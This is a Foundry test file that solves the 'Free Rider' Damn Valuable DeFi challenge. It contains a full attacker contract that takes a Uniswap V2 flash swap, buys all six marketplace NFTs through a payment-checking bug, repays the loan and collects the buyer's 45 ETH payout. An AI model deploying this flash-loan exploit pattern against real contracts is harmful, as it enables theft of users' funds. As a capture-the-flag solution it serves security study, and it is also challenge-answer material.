// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";

import {FreeRiderBuyer} from "../../../src/Contracts/free-rider/FreeRiderBuyer.sol";
import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WETH9} from "../../../src/Contracts/WETH9.sol";
import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";

interface attack {
    function buyMany(uint256[] calldata tokenIds)external payable;
    function safeTransferFrom(address from,address to,uint256 tokenId) external;
    function balanceOf(address owner) external returns (uint256);
    function withdraw(uint256) external;
    function deposit()external payable;
    function transfer(address dst,uint256 amt) external;

}


contract AttackerContract {
    address uniswap_pair;
    address dealer;
    address attacker;
    address uniswap_factory;
    address marketplace;
    address NFT;
    address weth;
    constructor(address _uniswap_pair,address _dealer ,address _attacker ,address _uniswap_factory,address _marketplace,address _NFT,address _weth){
        uniswap_pair = _uniswap_pair;
        dealer = _dealer;
        attacker = _attacker;
        uniswap_factory = _uniswap_factory;
        marketplace = _marketplace;
        NFT = _NFT;
        weth = _weth;
    }

    function trigger() public {
        console.log("entered");
       IUniswapV2Pair(uniswap_pair).swap(0,15000000000000000000,address(this), "0x0a");

        for(uint256 i = 0; i < 6; i++){
            attack(NFT).safeTransferFrom(address(this), address(dealer), i);
        }
       console.log("exited");
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public {
        console.log("callback entered");
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
        assert(msg.sender == IUniswapV2Factory(uniswap_factory).getPair(token0, token1)); // ensure that msg.sender is a V2 pair
        // rest of the function goes here!
        console.log("weth balance in callback",attack(weth).balanceOf(address(this)));
        console.log("address of attack contract",address(this));
        attack(weth).withdraw(15000000000000000000); 
        console.log("eth balance after withdrawl",address(this).balance);

        uint256[] memory tokenIds = new uint256[](6); 
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;

        attack(marketplace).buyMany{value:15 ether}(tokenIds);
        attack(weth).deposit{value:16 ether}();
        console.log("weth balance after deposit",attack(weth).balanceOf(address(this)));
        // IUniswapV2Pair(uniswap_pair).sync();
        uint256 borrowedETH = 15000000000000000000;
        uint256 Fee = ((borrowedETH * 3) / 997 + 1) ;
        uint256 amountToRepay = borrowedETH + Fee  ;    
        attack(weth).transfer(uniswap_pair,amountToRepay);

    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external  returns (bytes4) {
        console.log("onERC721Received called");
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }

    function executeTrade() public {
        for(uint256 i=0;i<6;i++){
        attack(NFT).safeTransferFrom(address(this),dealer,i);
        }
    }
    receive() external payable {
        console.log("received",msg.value);
    }
    function withdraw()public {
        payable(msg.sender).transfer(address(this).balance);
    }

}


contract FreeRider is Test {
    // The NFT marketplace will have 6 tokens, at 15 ETH each
    uint256 internal constant NFT_PRICE = 15 ether;
    uint8 internal constant AMOUNT_OF_NFTS = 6;
    uint256 internal constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    // The buyer will offer 45 ETH as payout for the job
    uint256 internal constant BUYER_PAYOUT = 45 ether;

    // Initial reserves for the Uniswap v2 pool
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 15_000e18;
    uint256 internal constant UNISWAP_INITIAL_WETH_RESERVE = 9000 ether;
    uint256 internal constant DEADLINE = 10_000_000;

    FreeRiderBuyer internal freeRiderBuyer;
    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
    DamnValuableToken internal dvt;
    DamnValuableNFT internal damnValuableNFT;
    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;
    WETH9 internal weth;
    address payable internal buyer;
    address payable internal attacker;
    address payable internal deployer;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        buyer = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("buyer")))))
        );
        vm.label(buyer, "buyer");
        vm.deal(buyer, BUYER_PAYOUT);

        deployer = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("deployer")))))
        );
        vm.label(deployer, "deployer");
        vm.deal(
            deployer,
            UNISWAP_INITIAL_WETH_RESERVE + MARKETPLACE_INITIAL_ETH_BALANCE
        );

        // Attacker starts with little ETH balance
        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.5 ether);

        // Deploy WETH contract
        weth = new WETH9();
        vm.label(address(weth), "WETH");

        // Deploy token to be traded against WETH in Uniswap v2
        vm.startPrank(deployer);
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy Uniswap Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Factory.json",
                abi.encode(address(0))
            )
        );

        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Router02.json",
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
        // Note that the function takes care of deploying the pair automatically
        dvt.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(dvt), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            DEADLINE // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapV2Pair = IUniswapV2Pair(
            uniswapV2Factory.getPair(address(dvt), address(weth))
        );

        assertEq(uniswapV2Pair.token0(), address(dvt));
        assertEq(uniswapV2Pair.token1(), address(weth));
        assertGt(uniswapV2Pair.balanceOf(deployer), 0);

        freeRiderNFTMarketplace = new FreeRiderNFTMarketplace{
            value: MARKETPLACE_INITIAL_ETH_BALANCE
        }(AMOUNT_OF_NFTS);

        damnValuableNFT = DamnValuableNFT(freeRiderNFTMarketplace.token());

        for (uint8 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(damnValuableNFT.ownerOf(id), deployer);
        }

        damnValuableNFT.setApprovalForAll(
            address(freeRiderNFTMarketplace),
            true
        );

        uint256[] memory NFTsForSell = new uint256[](6);
        uint256[] memory NFTsPrices = new uint256[](6);
        for (uint8 i = 0; i < AMOUNT_OF_NFTS; ) {
            NFTsForSell[i] = i;
            NFTsPrices[i] = NFT_PRICE;
            unchecked {
                ++i;
            }
        }

        freeRiderNFTMarketplace.offerMany(NFTsForSell, NFTsPrices);

        assertEq(freeRiderNFTMarketplace.amountOfOffers(), AMOUNT_OF_NFTS);
        vm.stopPrank();

        vm.startPrank(buyer);

        freeRiderBuyer = new FreeRiderBuyer{value: BUYER_PAYOUT}(
            attacker,
            address(damnValuableNFT)
        );

        vm.stopPrank();

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker, attacker);
        AttackerContract attackerContract = new AttackerContract(
            address(uniswapV2Pair),
            address(freeRiderBuyer),
            attacker,
            address(uniswapV2Factory),
            address(freeRiderNFTMarketplace),
            address(damnValuableNFT),
            address(weth)
            );
        attackerContract.trigger();
        attackerContract.withdraw();
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        /** SUCCESS CONDITIONS */

        // Attacker must have earned all ETH from the payout
        assertGt(attacker.balance, BUYER_PAYOUT);
        assertEq(address(freeRiderBuyer).balance, 0);

        // The buyer extracts all NFTs from its associated contract
        vm.startPrank(buyer);
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            damnValuableNFT.transferFrom(
                address(freeRiderBuyer),
                buyer,
                tokenId
            );
            assertEq(damnValuableNFT.ownerOf(tokenId), buyer);
        }

        vm.stopPrank();

        // Exchange must have lost NFTs and ETH
        assertEq(freeRiderNFTMarketplace.amountOfOffers(), 0);
        assertLt(
            address(freeRiderNFTMarketplace).balance,
            MARKETPLACE_INITIAL_ETH_BALANCE
        );
    }
}
